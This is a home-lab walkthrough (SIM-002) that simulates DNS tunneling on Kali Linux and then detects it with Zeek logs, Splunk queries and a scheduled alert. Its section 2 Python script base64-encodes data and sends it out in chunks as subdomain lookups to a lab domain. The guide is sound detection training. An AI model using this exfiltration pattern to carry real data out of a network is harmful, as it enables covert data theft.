# SIM-002 – DNS Tunneling (T1071.004) – Steps

---

## 1. Prerequisites

Before starting, verify the following systems are online:

- **Kali Linux (10.0.0.30)**
  - Internet access through pfSense
  - Python installed
  - `dnsutils` installed:
    ```
    sudo apt install dnsutils -y
    ```

- **Security Onion (10.0.0.20)**
  - Zeek running
  - Suricata running
  - DNS traffic visible

- **Splunk Enterprise (10.0.0.60)**
  - Ingesting Zeek DNS logs
  - Index for Zeek available

- **pfSense (10.0.0.1)**
  - All traffic routed through firewall

✅ Validate in Splunk:
```spl
index=* sourcetype=zeek:dns | head 5
```

---

## 2. Start a Fake DNS Exfiltration Domain (Simulation Only)

On **Kali Linux**:

```bash
sudo nano dns_exfil.py
```

Paste:
```python
import base64
import dns.resolver
import time

test_data = "ThisIsSimulatedExfilDataForSIM002"
encoded = base64.b64encode(test_data.encode()).decode()

for i in range(0, len(encoded), 10):
    chunk = encoded[i:i+10]
    domain = f"{chunk}.sim002.lab"
    try:
        dns.resolver.resolve(domain, "A")
    except:
        pass
    time.sleep(1)
```
Save and Exit.

---

## 3. Execute the DNS Tunneling Simulation

On Kali Linux:
```bash
python3 dns_exfil.py
```

**This generates:**
- ✅ High-frequency DNS queries
- ✅ Long encoded subdomains
- ✅ Suspicious entropy patterns

---

## 4. Validate DNS Telemetry in Security Onion (Zeek)

On Security Onion:
```so
sudo tail -f /nsm/sensor_data/*/zeek/dns.log
```

You should see:
- Repeated queries
- Long subdomain strings
- Base64-looking traffic
- Rapid frequency

***✅ Capture timestamp.***

---

## 5. Validate DNS Traffic in Splunk

Run:
```spl
sourcetype=zeek:dns
(query="*.sim002.lab")
| table _time, id.orig_h, id.resp_h, query
| sort - _time
```

✅ Expected:
- Long encoded subdomains
- High volume queries
- Repeated patterns

---

## 6. Detect DNS Tunneling by Entropy & Length
```spl
sourcetype=zeek:dns
| eval qlen=len(query)
| where qlen > 50
| table _time, id.orig_h, query, qlen
| sort - qlen
```

✅ Expected:
- Abnormally large DNS queries
- High entropy strings

---

## 7. Correlate Suspicious DNS Behavior
```spl
sourcetype=zeek:dns
| eval qlen=len(query)
| where qlen > 50
| eval simulation_id="SIM-002"
| eval symbolic_id="LAB-SIM-002-DNS-TUNNEL"
| table _time, id.orig_h, query, qlen, simulation_id, symbolic_id
| sort - _time
```

***✅ This becomes your primary detection correlation query.***

---

## 8. Configure Splunk Alert (LAB-SIM-002-DNS-TUNNEL)

Alert Settings:
- Type: Scheduled
- Run every: 5 minutes
- Time window: Last 15 minutes
- Trigger: If results ≥ 1
- Severity: High

✅ Output Fields:
- id.orig_h
- query
- qlen
- simulation_id
- symbolic_id

---

## 9. Save Screenshots

Store in:
simulations/SIM-002-DNS-Tunneling/screenshots/

Required:
- sim002-zeek-dns-log.png
- sim002-splunk-dns-search.png
- sim002-splunk-correlation.png
- sim002-alert-config.png
- sim002-alert-fired.png

---

10. Mark Simulation Completion

Update SIM-002 README.md checklist:
- [x] Steps executed
- [x] Logs captured
- [x] Queries validated
- [x] Alert firing
- [x] Screenshots saved
- [x] Detection matrix updated
